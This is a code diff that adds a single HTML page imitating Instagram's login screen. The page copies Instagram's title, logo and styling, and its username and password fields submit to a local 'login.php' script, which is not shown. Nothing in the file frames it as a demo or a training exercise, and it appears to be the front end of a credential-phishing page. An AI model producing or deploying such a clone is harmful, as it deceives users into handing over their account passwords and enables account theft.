@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: white;
+      border: 1px solid #dbdbdb;
+      padding: 40px 40px 30px;
+      width: 350px;
+      text-align: center;
+      border-radius: 1px;
+    }
+    .logo {
+      margin-bottom: 30px;
+    }
+    .logo img {
+      width: 175px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 9px 8px;
+      margin: 6px 0 12px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 14px;
+      background: #fafafa;
+    }
+    button {
+      background-color: #0095f6;
+      border: none;
+      color: white;
+      font-weight: bold;
+      padding: 8px 0;
+      width: 100%;
+      border-radius: 4px;
+      font-size: 14px;
+      cursor: pointer;
+      margin: 8px 0 18px 0;
+    }
+    button:hover {
+      background-color: #007acc;
+    }
+    .forgot {
+      font-size: 12px;
+      color: #00376b;
+      text-decoration: none;
+      display: block;
+      margin-top: 12px;
+    }
+    .forgot:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram" />
+    </div>
+    <form action="login.php" method="POST">
+      <input type="text" name="username" placeholder="Phone number, username, or email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+    <a href="#" class="forgot">Forgot password?</a>
+  </div>
+</body>
+</html>
+
